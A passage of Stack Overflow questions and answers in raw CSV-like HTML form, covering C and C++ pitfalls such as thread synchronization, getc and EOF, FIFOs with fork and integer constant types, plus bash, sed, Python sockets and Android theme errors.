    //code to modify g_ptr to point to a valid address 
}

read_from_addr() {
    //code which uses g_ptr to read values from the memory it's pointing to
}
</code></pre>

<p>file2.c:</p>

<pre><code>function2A() {
    read_from_addr();
}
</code></pre>

<p>So I have threadA which runs through file1.c and executes modify_ptr(&amp;g_ptr) and also read_from_addr(). And then threadB runs, and it runs through file2.c executing function2A(). </p>

<p>My question is: Does threadB see that g_ptr is modified? Or does it still see that it's pointing to NULL? </p>

<p>If that's not the case, what does it mean for a pointer to be global? And how do I ensure that this pointer is accessible between different threads?</p>

<p>Please let me know if I need to clarify anything. Thanks</p>
","9530","","<blockquote>
  <p>My question is: Does threadB see that g_ptr is modified? Or does it still see that it's pointing to NULL?</p>
</blockquote>

<p>Maybe.  If accessed without any sort of external synchronization, you're likely to see bizarre, highly non-reproducible results -- in certain cases, the compiler may make certain optimizations based on its analysis of your code which can stem from assuming that a variable is not modified during certain code paths.  For example, consider this code:</p>

<pre><code>// Global variable
int global = 0;

// Thread 1 runs this code:
while (global == 0)
{
    // Do nothing
}

// Thread 2 at some point does this:
global = 1;
</code></pre>

<p>In this case, the compiler can see that <code>global</code> is not modified inside the <code>while</code> loop, and it doesn't call any external functions, so it can ""optimize"" it into something like this:</p>

<pre><code>if (global == 0)
{
    while (1)
    {
        // Do nothing
    }
}
</code></pre>

<p>Adding the <code>volatile</code> keyword to the declaration of the variable prevents the compiler from making this optimization, but this was not the intended use case of <code>volatile</code> when the C language was standardized.  Adding <code>volatile</code> here will only slow down your program in small ways and mask the real problem -- lack of proper synchronization.</p>

<p>The proper way to manage global variables that need to be accessed simultaneously from multiple threads is to use mutexes to protect them<sup>1</sup>.  For example, here's a simple implementation of <code>modify_ptr</code> using a POSIX threads mutex:</p>

<pre><code>uint64_t *g_ptr = NULL;
pthread_mutex_t g_ptr_mutex = PTHREAD_MUTEX_INITIALIZER;

void modify_ptr(uint64_t **ptr, pthread_mutex_t *mutex)
{
    // Lock the mutex, assign the pointer to a new value, then unlock the mutex
    pthread_mutex_lock(mutex);
    *ptr = ...;
    pthread_mutex_unlock(mutex);
}

void read_from_addr()
{
    modify_ptr(&amp;g_ptr, &amp;g_ptr_mutex);
}
</code></pre>

<p>Mutex functions ensure that the proper memory barriers are inserted, so any changes made to a variable protected by a mutex will be properly propagated to other CPU cores, provided that every access of the variable (including reads!) is protected by the mutex.</p>

<p><sup>1)</sup> You can also use specialized lock-free data structures, but those are an advanced technique and are very easy to get wrong</p>
"
"<p>I'm very confused about the following code:</p>

<pre><code>class Tree {
protected:
    struct Node {
        Node* leftSibling;
        Node* rightSibling;
        int value;
    };  
private:
    Node* root;
    int value;
.....
public:
    void addElement(int number) {
        if (root == NULL) {
            printf(""This is the value of the pointer %lld\n"",(long long)root);
            printf(""This is the value of the int %d\n"",value);
            ...
            return;
        }
        printf(""NOT NULL\n"");
    }
};


int main() {
    Tree curTree;
    srand(time(0));
    for(int i = 0;i &lt; 40; ++i) {
        curTree.addElement(rand() % 1000);
    }
}
</code></pre>

<p>The <code>curTree</code> variable is local to the main function so I expected it to not have its members initialized to 0, but they are both initialized.</p>
","9530","","<p>No, it has <strong>unspecified contents</strong>.  Those contents might be random memory garbage, or they could just happen to be 0, depending on whatever data was left in their memory location beforehand.</p>

<p>It might just happen that due to the way the code was compiled, the particular stack location containing <code>root</code> always has 0 (say, because an earlier local variable occupying that same stack location always ended up as 0).  But you cannot rely on this behavior -- you must properly initialize anything before reading it back, otherwise you enter the land of Undefined Behavior.</p>
"
"<p>I wonder, are there any ways to generate with the gcc some native x86 code (which can be booted without any OS)?</p>
","9530","","<p>Yes, the Linux kernel is compiled with GCC and runs in ring 0 on x86.</p>
"
"<p>I have the following data.txt: </p>

<pre><code> 95 flour.
 47 water.s
 etc..
</code></pre>

<p>I need to remove everything after the period . in the file to yield something like this: </p>

<pre><code> 95 flour
 47 water
 etc..
</code></pre>

<p>I have tried the  using these sed command without success, which yield a blank document: </p>

<pre><code>sed ""s/'.*//"" data.txt &gt; cleaned.txt 
sed 's/\.*//' data.txt &gt; cleaned.txt 
</code></pre>
","9530","","<p>Either escape the <code>.</code> with a backslash to get a literal <code>.</code>, or use brackets to define a character  class:</p>

<pre><code>sed 's/\..*$//' data.txt &gt; cleaned.txt
sed 's/[.].*$//' data.txt &gt; cleaned.txt
</code></pre>

<p>You tried <code>'s/\.*//'</code>, which is ""zero or more literal dots"", which is different from ""literal dot followed by zero or more of anything"", i.e. <code>'s/\..*//'</code>.  I also added a <code>$</code> for good measure.</p>
"
"<p>I've an array of strings (variable size...) like this:</p>

<pre><code>arr=( ""one str"" ""another str"" ""example"" ""last-string"" )
</code></pre>

<p>I need the following output:</p>

<pre><code>one str:one str another str:another str example:example last-string:last-string
</code></pre>

<p>The problem is that when i do something like:</p>

<pre><code>$(printf "" %s:%s"" ""${arr[@]}"")
</code></pre>

<p>It iterates over the array, moving to next position of the string (without repeating!), and the result is like:</p>

<pre><code>one str:another str  example:last-string
</code></pre>

<p>How can I achive this with printf? without any loops!</p>

<p>I'm using bash 3.1.0(1) in Cygwin if that helps!</p>
","9530","","<p>You can't do this with bash's built-in <code>printf</code> function.  You'll either need to use a loop or an external program, e.g. Python:</p>

<pre><code># With a loop:
for x in ""${arr[@]}""; do
  printf "" %s:%s"" ""$x"" ""$x""
done

# With Python
python -c 'import sys; print """".join("" %s:%s"" % (arg, arg) for arg in sys.argv[1:])' ""${arr[@]}""
</code></pre>
"
"<p>I have created a project with following settings for Target :</p>

<pre><code>&lt;uses-sdk
        android:minSdkVersion=""8""
        android:targetSdkVersion=""18"" /&gt;
</code></pre>

<p>But following error persists at values-v11 and values-v14:</p>

<p>ERROR : No resource found that matches the given name 'android:Theme.Holo.Light'</p>

<pre><code>&lt;resources&gt;

    &lt;!--
        Base application theme for API 11+. This theme completely replaces
        AppBaseTheme from res/values/styles.xml on API 11+ devices.
    --&gt;
    &lt;style name=""AppBaseTheme"" parent=""android:Theme.Holo.Light""&gt;
        &lt;!-- API 11 theme customizations can go here. --&gt;
    &lt;/style&gt;

&lt;/resources&gt;
</code></pre>
","9530","","<p>Assuming you're using Eclipse, you need to right-click your project in the Package Explorer, select <strong>Properties</strong>, select <strong>Android</strong>, and set <strong>Project Build Target</strong> to API level 14 or higher.  Or equivalently, set <code>target=android-14</code> or higher in your project's <code>project.properties</code> file, but note that this file is autogenerated by Eclipse, so manually editing it is not recommended.</p>
"
"<p>Not keen on using the <code>parseInteger</code> solution, it is ugly, and as Joshua Bloch says you should ""Use exceptions only for exceptional conditions"". Of course, I can use something like block of code below, but it doesn't guarantee it is an Integer. </p>

<pre><code>for (char c : str.toCharArray())
{
    if (!Character.isDigit(c)) return false;
}
return true;
</code></pre>
","9530","","<p>""Use exceptions only for exceptional conditions"" is a good practice to follow in general, but it's not a hard-and-fast rule.  I think that this is one of the cases where using exceptions is better than the alternatives.</p>

<p>Since <code>parseInteger()</code> can return any possible <code>int</code> value, you can't use any other return value to indicate failure.  If you know you're never going to process a particular value (such as <code>-1</code> or <code>-2147483648</code>), you can return that as a sentinel value to indicate a parse failure.</p>

<p>The only alternative is to return a <code>boolean</code> indicating success or failure and to store the parsed value into a parameter.  However, since function calls are always pass-by-value in Java, you'd need to create a new class to do this:</p>

<pre><code>public class IntWrapper
{
    int value;
}
...

public static boolean myParseInt(String s, IntWrapper outValue)
{
    try
    {
        outValue.value = Integer.parseInt(s);
        return true;
    }
    catch(NumberFormatException e)
    {
        return false;
    }
}
...

IntWrapper value = new IntWrapper();
if (myParseInt(value))
{
    // Use value.value
}
else
{
    // Parsing failed
}
</code></pre>

<p>Given these alternatives, I think the simplest usage is just to use exceptions and deal with them appropriately, even though non-numeric input may not necessary be an ""exceptional"" condition.</p>
"
"<p>I'm using the following code to read from a text (.xml) file I have created in a text editor (Notepad++), convert the UTF-8 text I read from it into UTF-16 so that Windows API functions can use it, and then write this UTF-16 encoded text back into a second file.</p>

<p>My problem is that when I open the output file in Notepad++, I don't get what I'm expecting to see, no matter what encoding I ask the text editor to use. There are null characters before almost every character in the file. I assume that either I did something wrong while writing the UTF-16 to the output file or Notepad++ is reading as single byte chars.</p>

<p>Any idea please? Here is the code:</p>

<pre><code>#define UNICODE

// includes...

int main( int argc, char * argv[] )
{
    FILE * pzInFile,
         * pzOutFile;

    try
    {
        char   sUtf8[8192];
        char * pcDst = sUtf8;

        wchar_t wsUtf16[8192];

        _wfopen_s( &amp; pzInFile, L""../config-sample.xml"", L""r"" );
        _wfopen_s( &amp; pzOutFile, L""../config-sample2.xml"", L""w+"" );

        if( pzInFile &amp;&amp; pzOutFile )
        {
            size_t uiRead;

            while( uiRead = fread_s( pcDst, sizeof( sUtf8 ), 1, 1, pzInFile ) )
            {
                pcDst += uiRead;
            }

            size_t uiLen = pcDst - sUtf8;

            sUtf8[uiLen] = 0;

            MultiByteToWideChar( CP_UTF8, 0, sUtf8, 8192, wsUtf16, 8192 ); // UTF-8 to UTF-16

            fwrite( wsUtf16, 1, uiLen, pzOutFile );
        }
        else
        {
            throw L""Failed to open file"";
        }
    }
    catch( const wchar_t * pwsMsg )
    {
        ::MessageBox( NULL, pwsMsg, L""Error"", MB_OK | MB_TOPMOST | MB_SETFOREGROUND );
    }

    if( pzInFile )
    {
        fclose( pzInFile );
        pzInFile = 0;
    }
    if( pzOutFile )
    {
        fclose( pzOutFile );
        pzOutFile = 0;
    }

    return 0;
}
</code></pre>
","9530","","<p>For UTF-16-encoded text files, you should write out a <a href=""https://en.wikipedia.org/wiki/Byte_order_mark"" rel=""nofollow"">byte order mark (BOM)</a> to the start of the file so that any program reading the file knows if the file is little-endian (UTF-16LE) or big-endian (UTF-16BE).  If a text file doesn't begin with either the two bytes <code>FF FE</code> or <code>FE FF</code>, then most programs assume that the file was written with a single-byte encoding (e.g. UTF-8 or Windows-1252).</p>

<p>One way to do that would be like so:</p>

<pre><code>wchar_t bom = 0xFEFF;
fwrite(&amp;bom, 1, sizeof(bom), pzOutFile);
fwrite(wsUtf16, 1, uiLen, pzOutFile);
</code></pre>
"
"<p>My answer to <a href=""http://stackoverflow.com/q/18706587/845092"">this question</a> was this function:</p>

<pre><code>inline bool divisible15(unsigned int x) 
{
    //286331153 = (2^32 - 1) / 15
    //4008636143 = (2^32) - 286331153
    return x * 4008636143 &lt;= 286331153;
}
</code></pre>

<p>It perfectly worked on my machine with VS2008 compiler, however <a href=""http://ideone.com/HKqjiw"" rel=""nofollow"">here</a> it doesn't work at all.</p>

<p>Does anyone has an idea, why it I get different results on different compilers?  <code>unsigned</code> overflow isn't undefined behavior.</p>

<p><strong>Important note:</strong> after some test it was confirmed it is faster than taking the remainder of the division by 15. (However not on all compilers)</p>
","9530","","<p>It's not Undefined Behavior, it's just a breaking change in the C language standard between C89 and C99.</p>

<p>In C89, integer constants like 4008636143 that don't fit in an <code>int</code> or <code>long int</code> but do fit in an <code>unsigned int</code> are unsigned, but in C99, they are either <code>long int</code> or <code>long long int</code> (depending on whichever one is the smallest one that can hold the value).  As a result, the expressions all get evaluated using 64 bits, which results in the incorrect answer.</p>

<p>Visual Studio is a C89 compiler and so results in the C89 behavior, but that Ideone link is compiling in C99 mode.</p>

<p>This becomes more evident if you compile with GCC using <code>-Wall</code>:</p>

<pre><code>test.c: In function ‘divisible15’:
test.c:8:3: warning: this decimal constant is unsigned only in ISO C90
</code></pre>

<p>From C89 §3.1.3.2:</p>

<blockquote>
  <p>The type of an integer constant is the first of the corresponding
  list in which its value can be represented.  Unsuffixed decimal: int,
  long int, unsigned long int; unsuffixed octal or hexadecimal: int,
  unsigned int, long int, unsigned long int; [...]</p>
</blockquote>

<p>C99 §6.4.4.1/5-6:</p>

<blockquote>
  <p>5) The type of an integer constant is the first of the corresponding list in which its value can
  be represented.</p>

<pre><code>Suffix | Decimal Constant | Octal or Hexadecimal Constant
-------+------------------+------------------------------
none   | int              | int
       | long int         | unsigned int
       | long long int    | long int
       |                  | unsigned long int
       |                  | long long int
       |                  | unsigned long long int
-------+------------------+------------------------------
[...]
</code></pre>
  
  <p>6) If an integer constant cannot be represented by any type in its list, it may have an
  extended integer type, if the extended integer type can represent its value. If all of the
  types in the list for the constant are signed, the extended integer type shall be signed. [...]</p>
</blockquote>

<p>For completeness, C++03 actually does have Undefined Behavior for when the integer constant is too big to fit in a <code>long int</code>.  From C++03 §2.13.1/2:</p>

<blockquote>
  <p>The type of an integer literal depends on its form, value, and suffix. If it is decimal and has no suffix, it has
  the first of these types in which its value can be represented: <code>int</code>, <code>long int</code>; if the value cannot be represented
  as a <code>long int</code>, the behavior is undefined. If it is octal or hexadecimal and has no suffix, it has the
  first of these types in which its value can be represented: <code>int</code>, <code>unsigned int</code>, <code>long int</code>, <code>unsigned
  long int</code>. [...]</p>
</blockquote>

<p>The C++11 behavior is identical to C99, see C++11 §2.14.2/3.</p>

<p>To ensure that the code behaves consistently when compiled as either C89, C99, C++03, and C++11, the simple fix is to make the constant 4008636143 unsigned by suffixing it with <code>u</code> as <code>4008636143u</code>.</p>
"
"<p>I was trying to copy the contents of one music file(.mp3) to create another music(.mp3) file. I tried this,</p>

<pre><code>     #include&lt;stdio.h&gt;
     #include&lt;conio.h&gt;
     int main()
     {
      FILE *a, *b;
      char c;

     a = fopen(""linkinpark.mp3"",""rb"");
     b = fopen(""linkinpark1.mp3"",""wb"");
     while((ch = getc(a)) != EOF)
     fprintf(b,""%c"",ch);
     fclose(a);
     fclose(b);
     return 0;
     }  
</code></pre>

<p>May be i am making some mistake like using a char variable and writing it in a binary file and also linkinpark1.mp3 is created but its corrupted.<br>
What could be its possible solution? </p>
","9530","","<p><code>getc()</code> returns either an <code>int</code>, not a <code>char</code>.  It needs to return <code>int</code> because it returns either the next byte read from the stream as a value between 0 and 255, <em>or</em> the value <code>EOF</code>, which is typically -1.  Since there are 257 possible outputs, you need to be able to distinguish between the byte 255 and the sentinel <code>EOF</code>, but your code is conflating the two.  Hence, once you hit the first byte with value 255, it erroneously cuts the file off short.</p>

<p>If you change <code>c</code> to be <code>int</code> instead of <code>char</code>, it should work correctly.</p>
"
"<p>I have written a simple code where one process is passing a structure to another process, the parent process is writing the data, but child process is not able to access it. I have used <code>fork()</code> system call to create two processes. But i have problem here the parent process i called twice and child process is also called twice when i run the program. Can any one let me know what mistake i am doing.</p>

<pre><code>#include &lt;stdlib.h&gt;
#include &lt;signal.h&gt;
#include &lt;stdio.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/errno.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;

#define MAX_LINE_LEN    100
#define FIFO_NAME ""my_fifo""

typedef struct student_info  {
char *name;
int age;
char *sex;
}student;

int w_byte_parent = 0, r_byte_parent = 0;
int w_byte_child = 0, r_byte_child = 0;

void do_child() {
  int fifo;
  char buffer[MAX_LINE_LEN];
  int i = 0;
  student child;

  printf(""Child opening FIFO \n"");
  if( (fifo = open(FIFO_NAME, O_RDWR)) &lt; 0 )   {
    perror(""open in child failed"");
    exit(EXIT_FAILURE);
  }
  printf(""Child  reading  from FIFO \n"");
  r_byte_child = read(fifo, child, sizeof(student));
  if(r_byte_child &lt; 0)
    printf(""Read failed by child process\n"");
  printf(""%d Bytes read by child process\n"", r_byte_child);
  }

 int main(int argc, char **argv)  {
 int fifo;
 char buffer[MAX_LINE_LEN];
 int ch = 0, i = 0;

 /*
 ** Create a FIFO
 */
 /* Parent creating FIFO */
if( (mkfifo(FIFO_NAME, 0666)) &lt; 0)  {
    if( errno != EEXIST ) {
        perror( ""mkfifo"" );
        exit( EXIT_FAILURE );
    }
}
/*
 ** Create other process 
 */

switch(fork())  {
    case -1:
        perror(""fork()"");
        exit(EXIT_FAILURE);
    case 0: /* Child Process */
        do_child();
        break;
    default:/* Parent Process */
        break;
}
/* Pass a structure to FIFO */
student *info;
info = (student *)malloc( sizeof (student)) ;
info-&gt;name = (char *)calloc(sizeof(char), 10);
strcpy(info-&gt;name, ""jack"");
info-&gt;age = 27;
info-&gt;sex = (char *)calloc(sizeof(char), 10);
strcpy(info-&gt;sex , ""Male"");

/* Parent Opening FIFO */
printf(""parent opening FIFO \n"");
if( (fifo = open(FIFO_NAME,  O_RDWR)) &lt; 0 )   {
    perror(""open in parent failed"");
    exit(EXIT_FAILURE);
}

/*
 ** Write some thing into FIFO so child can read it
 */
printf(""parent writing to FIFO \n"");
w_byte_parent = write( fifo, info, sizeof(struct student_info));
if(w_byte_parent &lt; 0)
    printf(""Nothing was written to FIFO by parent\n"");
printf(""Wrote %d bytes to FIFO\n"",w_byte_parent);
}
</code></pre>
","9530","","<p>Let's start with the basics.  Compiling your code with GCC with the <code>-Wall</code> option:</p>

<pre><code>$ gcc fifo.c -o fifo -Wall
fifo.c: In function ‘do_child’:
fifo.c:33: warning: implicit declaration of function ‘read’
fifo.c:24: warning: unused variable ‘i’
fifo.c:23: warning: unused variable ‘buffer’
fifo.c: In function ‘main’:
fifo.c:48: warning: implicit declaration of function ‘mkfifo’
fifo.c:58: warning: implicit declaration of function ‘fork’
fifo.c:88: warning: implicit declaration of function ‘write’
fifo.c:42: warning: unused variable ‘i’
fifo.c:42: warning: unused variable ‘ch’
fifo.c:41: warning: unused variable ‘buffer’
fifo.c:92: warning: control reaches end of non-void function
</code></pre>

<p>Ignoring all of the unused variables problems, you need to include <code>&lt;unistd.h&gt;</code> and <code>&lt;sys/stat.h&gt;</code> to get proper declarations of <code>read</code>, <code>mkfifo</code>, <code>fork</code>, and <code>write</code>.  Compiling again:</p>

<pre><code>$ gcc fifo.c -o fifo -Wall -Wno-unused
fifo.c: In function ‘do_child’:
fifo.c:35: error: incompatible type for argument 2 of ‘read’
fifo.c: In function ‘main’:
fifo.c:94: warning: control reaches end of non-void function
</code></pre>

<p>You're passing a <code>student</code> instance as parameter 2 to <code>read</code>, but it expects a <code>void*</code> pointer.  You need to pass the <em>address</em> of the <code>student</code> instance as <code>&amp;child</code>.  Also, it would be good to explicitly return a value form <code>main()</code>, although that's not strictly necessary, since failing to return a value form <code>main()</code> implicitly returns 0 (but <em>only</em> for the <code>main()</code> function).</p>

<p>But even with those errors corrected, you still see the output of the parent process twice.  Why?  Because both the parent and the child processes are executing the code block below the switch statement.  The child process calls the <code>do_child()</code> function and never exits, so it returns and continues executing.</p>

<p>The simple fix to that is make sure to exit the child process, either at the end of <code>do_child()</code>, or immediately after the call returns, e.g.</p>
"
"<p>In Python, when a int bigger than 2**31, then it will turn to a long:</p>

<p><code>a = 2147483647</code>
<code>a + 1 = 2147483648</code></p>

<p><code>b = -2147483648</code>
<code>b - 1  = -2147483649</code></p>

<p>but I need the Python int overflow like the int in C:</p>

<p><code>a = 2147483647</code>
<code>a + 1 = -2147483648</code></p>

<p><code>b = -2147483648</code>
<code>b - 1  = 2147483647</code></p>

<p>Is it possible?
thanks in advance!</p>
","9530","","<p>You can define your own class and override the <code>__int__()</code> special method, along with various other mathematical operator special methods, to <a href=""http://docs.python.org/2/reference/datamodel.html#emulating-numeric-types"" rel=""nofollow"">emulate a numeric type</a>.  Then your class can maintain the invariant that the value is always in the proper range.</p>

<p>For example:</p>

<pre><code>def class Int32:
    def __init__(self):
        self.value = 0

    def __init__(self, value):
        # Wrap value into [-2**31, 2**31-1]
        self.value = (value + 2**31) % 2**32 - 2**31

    def __int__(self):
        return self.value

    def __add__(self, other):
       return Int32(self.value + other.value)

    # ... etc. for other mathematical operators
</code></pre>
"
"<p>I'm trying to compile a project which consist of severel source fies &amp; header files &amp; includes some structure definiton. But when I compile an error comes </p>

<p>""error: expected specifier-qualifier-list before 'typedef'"" in file ""uip.h""</p>

<p>I have a structure in file named as ""httpd.h""</p>

<pre><code>    struct httpd_state {
    unsigned char timer;
    struct psock sin, sout;
    struct pt outputpt, scriptpt;
    char inputbuf[50];
    char filename[20];
    char state;
    struct httpd_fsdata_file_noconst *file;
    int len;
    char *scriptptr;
    int scriptlen;
    unsigned short count;
    };
</code></pre>

<p>I want to typedef this structure in another file named as ""uip.h""</p>

<pre><code>    struct uip_conn {
    uip_ipaddr_t ripaddr;   /**&lt; The IP address of the remote host. */
    u16_t lport;        /**&lt; The local TCP port, in network byte order. */
    u16_t rport;        /**&lt; The local remote TCP port, in network order. */
    u8_t rcv_nxt[4];    /**&lt; The sequence number that we expect toreceive next. */
    u8_t snd_nxt[4];    /**&lt; The sequence number that was last sent by us. */
    u16_t len;          /**&lt; Length of the data that was previously sent. */
    u16_t mss;          /**&lt; Current maximum segment size for the connection. */
    u16_t initialmss;   /**&lt; Initial maximum segment size for the connection. */
    u8_t sa;            /**&lt; Retransmission time-out calculation state variable. */
    u8_t sv;            /**&lt; Retransmission time-out calculation state variable. */
    u8_t rto;           /**&lt; Retransmission time-out. */
    u8_t tcpstateflags; /**&lt; TCP state and flags. */
    u8_t timer;         /**&lt; The retransmission timer. */
    u8_t nrtx;          /**&lt; The number of retransmissions for the last segment sent*/
  /** The application state. */
   **typedef struct httpd_state uip_tcp_appstate_t;
   uip_tcp_appstate_t appstate;**
   } __attribute__((packed));
</code></pre>

<p>Can anyone please help??</p>
","9530","","<p>You can't have a <code>typedef</code> statement inside a <code>struct</code> definition.  Either hoist it outside of the <code>struct</code>, or don't use the <code>typedef</code> at all:</p>

<pre><code>// Option #1: Hoisting
typedef struct httpd_state uip_tcp_appstate_t;
struct uip_conn {
    ...
    uip_tcp_appstate_t appstate;
};

// Option #2: No typedef
struct uip_conn {
    ...
    struct httpd_state appstate;
};
</code></pre>
"
"<p>I'm given this function and want to know the time complexity:</p>

<pre><code>int f2(int n) {
    if(n&lt;2) return 1;
    return f2(n/2)+f2(n-2);
}
</code></pre>

<p>I calculated its runtime to be O(n<sup>2</sup>) using the telescopic expansion method.  Is this correct?</p>

<p><strong>Edit:</strong> After reconsidering, I found that this function has a similar structure to mergesort, which has complexity &Theta;(n log n).  Is that correct?</p>
","9530","","<p>Suppose that it's polynomial in n, i.e. that the running time T(n) is at most a*n<sup>b</sup> for some constants <code>a</code> and <code>b</code>.  Then, we have:</p>

<pre><code>T(n) = T(n/2) + T(n-2)
     = a*(n/2)^b + a*(n-2)^b
     = a/2^b * n^b + a*n^b + (lower-order terms)
     = a*n^b * (1/2^b + 1) + (lower-order terms)
</code></pre>

<p>Where the <code>(lower-order terms)</code> consist of sums and differences of <code>n</code> raised to powers strictly less than <code>b</code>.  For sufficiently large <code>n</code>, the a*n<sup>b</sup> * (1/2<sup>b</sup> + 1) term will dominate the lower-order terms, and that will always be larger than a*n<sup>b</sup>, so it's not true that T(n) is O(n<sup>b</sup>) for any constant <code>b</code>.</p>

<p>Now suppose that it's exponential in n, i.e. that T(n) is at most a*b<sup>n</sup> for some constants <code>a</code> and <code>b</code>.  Then:</p>

<pre><code>T(n) = T(n/2) + T(n-2)
     = a*b^(n/2) + a*b^(n-2)
     = a*b^n * (b^(-n/2) + 1/b^2)
</code></pre>

<p>Now if b > 1 and n >= -2 log(1 - 1/b<sup>2</sup>) / log(b), then:</p>

<pre><code>n &gt;= -2 log(1 - 1/b^2) / log(b)
-n/2 &lt;= log(1 - 1/b^2) / log(b) = log_b(1 - 1/b^2)
b^(-n/2) &lt;= 1 - 1/b^2
b^(-n/2) + 1/b^2 &lt;= 1
T(n) = a*b^n * (b^(-n/2) + 1/b^2) &lt;= a*b^n * 1 = a*b^n
</code></pre>

<p>Hence, for any a > 0 and b > 1, there exists an N (equal to -2 log(1 - 1/b<sup>2</sup>) / log(b)) such that for all n >= N, T(n) &lt;= a*b^n.</p>

<p>So what does this say?  T(n) is more than polynomial (for <em>any</em> polynomial; that also includes polylogarithmic functions, such any polylogarithmic function is o(a larger non-logarithmic polynomial)), but T(n) is less than any exponential.  I'm not sure if there's a simple formulation for the exact result, but those are some useful bounds.</p>

<p><strong>EDIT</strong></p>

<p>As nhahtdh points out, this makes the running time something called <a href=""https://en.wikipedia.org/wiki/Time_complexity#Quasi-polynomial_time"" rel=""nofollow""><em>quasi-polynomial time</em></a>.</p>
"
"<pre><code>void f()
{}

void test()
{
    auto fn_1 = f;
    auto fn_2 = &amp;f;

    assert(fn_1 == fn_2); // OK

    fn_1();      // OK
    fn_2();      // OK
    (*fn_1)();   // OK
    (*fn_2)();   // OK
    (**fn_1)();  // OK
    (**fn_2)();  // OK
    (***fn_1)(); // OK
    (***fn_2)(); // OK
}
</code></pre>

<p>Are these behaviors explicitly defined by the C++ standard?</p>
","9530","","<p>The issue at play here is that a function decays into a function pointer.  The types of both of the variables <code>fn_1</code> and <code>fn_2</code> are <code>void (*)()</code>, i.e. ""pointer to function taking no arguments and returning <code>void</code>"".  In the case of <code>fn_1</code>, the function <code>f</code> decays into a pointer to a function, while in the case of <code>fn_2</code>, you explicitly assign a pointer to a function to <code>fn_2</code>, and no decaying takes place.</p>
"
"<p>Sorry, I know this is really basic, but I don't know how to search it the proper way, so here we go.
I'm trying to call MessageBoxA, and I want the message to replace '%s' with something else. Example:</p>

<pre><code>MessageBoxA(0, TEXT(""You have %s items""), ""title"", 0);
</code></pre>

<p>Can anyone help me? And once again, I know this is really basic, sorry.</p>
","9530","","<p>You have to build the string yourself.  In C++, this is typically done with <code>std::ostringstream</code>, e.g.:</p>

<pre><code>#include &lt;sstream&gt;
...

std::ostringstream message;
message &lt;&lt; ""You have "" &lt;&lt; numItems &lt;&lt; "" items"";
MessageBoxA(NULL, message.str().c_str(), ""title"", MB_OK);
</code></pre>

<p>In C, this is typically done with <a href=""http://linux.die.net/man/3/snprintf""><code>snprintf(3)</code></a>:</p>

<pre><code>#include &lt;stdio.h&gt;
...

char buffer[256];  // Make sure this is big enough
snprintf(buffer, sizeof(buffer), ""You have %d items"", numItems);
MessageBoxA(NULL, buffer, ""title"", MB_OK);
</code></pre>
"
"<p>If I have a UNIX shell script which has some commands on each line that needs to be run, like</p>

<pre><code>#!/bin/bash
command1
command2
</code></pre>

<p>command2 to be excuted only after completion of command1. how to achieve it</p>
","9530","","<p>You've already done it.  bash normally waits for each command to run before running the next command.  If you end the command with an ampersand (<code>&amp;</code>), then it runs the command in the background, but since you haven't done that, each command runs synchronously.</p>
"
"<p>I am writing a client server program in C. The problem:
while server is listening and accepting new connections, it is also storing the IP's it is connected to. Now if we enter a command say LIST in the server program window which is still running, then it should display the list of IP's it is connected to ?
I am using the Select() function for each client.</p>

<p>In short, how to accept input from keyboard while answering the incoming connections?</p>
","9530","","<p>Just include the file descriptor for standard input (<code>STDIN_FILENO</code>, aka 0) in the set of file descriptors passed into <code>select(2)</code>.  Then, if input is available for reading on that, you read from it and process the command; otherwise, process the sockets as usual.</p>

<p>Alternatively, you could run a separate thread to handle user input, but given that you already have the <code>select</code> call in place, it's probably easier to continue using that.</p>
"
"<p>There is an error while compiling the following program,can anyone tell me why the compiler giving such error? </p>

<pre><code>`#include &lt;stdio.h&gt;
void display(int **,int,int);
int main ()
{
int a[3][4]={1,2,3,4,5,6,7,8,9,0,1,6};
display(a,3,4);


return 0;
}
void display(int **a,int b,int c){

}
</code></pre>

<p><strong>Error while compiling</strong></p>

<pre><code> ` ptr.c: In function ‘main’:

  ptr.c:6:1: warning: passing argument 1 of ‘display’ from incompatible pointer type [enabled by default]
  ptr.c:2:6: note: expected ‘int **’ but argument is of type ‘int (*)[4]’ `
</code></pre>
","9530","","<p>An array is not a pointer.  An array <em>decays</em> into a pointer to its first element in certain contexts, but <em>only at the first level</em> -- an array of arrays decays into a pointer to arrays, but not to a pointer to pointers.  The rule is not applied recursively.</p>

<p>See the <a href=""http://c-faq.com/aryptr/pass2dary.html"" rel=""nofollow"">C FAQ</a> for a more detailed explanation.</p>
"
"<p>I am writing a client-sever program based on Python socket.
The client sends a command to the server and the server responds.
But now, some client can broadcast a message to other clients, so the client can receive more than one response at the same time.</p>

<pre><code>data = s.recv(1024)
</code></pre>

<p>the line of code above will retrieve only one response from the server.
but if I use a while loop like this </p>

<pre><code>while True:
    data = s.recv(1024)
    if not data: break
</code></pre>

<p>actually, <code>data=s.recv(1024)</code> will block the program when there is no data left.
I don't want to block the program and want to retrieve all the responses available in the connection at one time. Can anyone find a solution? Thank you.</p>
","9530","","<p>You can use the <a href=""http://docs.python.org/2/library/select.html"" rel=""nofollow""><code>select</code> module</a> to wait until the socket is readable or until a timeout has elapsed; you can then perform other processing.  For example:</p>

<pre><code>while True:
    # If data can be received without blocking (timeout=0), read it now
    ready = select.select([s], [], [], 0)
    if s in ready[0]:
        data = s.recv(1024)
        # Process data
    else:
        # No data is available, perform other tasks
</code></pre>
"
"<p>I am writing a program where one process A reads the data appended to file by another process B.I am using ReadDirectoryChangesW for the notification.The problem is that the notification is not being generated until I close the handle in B although I am flushing contents to file using fflush.The code is a given below</p>

<p>File Writer:</p>

<pre><code>int _tmain(int argc, _TCHAR* argv[])
{
    FILE *fp;

    fp=_fsopen(""log.txt"", ""a"", _SH_DENYNO);

    char str[4096];

    for(int i=1;i&lt;4096;i++)
        str[i]=i;

    while(true){
        fwrite(str,1,4096,fp);
        fflush(fp);
        Sleep(2000);
    }

    return 0;
}
</code></pre>

<p>File Reader:</p>

<pre><code>#include ""stdafx.h""
#include &lt;windows.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;tchar.h&gt;
#include &lt;conio.h&gt;
#include &lt;assert.h&gt; 
#include &lt;share.h&gt;

void _tmain(int argc, TCHAR *argv[])
{
    FILE *fp;
    fp=_fsopen(""C:\\Users\\dell\\Documents\\Visual Studio 2012\\Projects\\FileWriter\\FileWriter\\log.txt"", ""r"", _SH_DENYNO);
    int last_size=0,new_size=0;

    if(fp==NULL)
        return ;

    HANDLE m_hMonitoredDir = CreateFile(TEXT(""C:\\Users\\dell\\Documents\\Visual Studio 2012\\Projects\\FileWriter\\FileWriter""), FILE_LIST_DIRECTORY, 
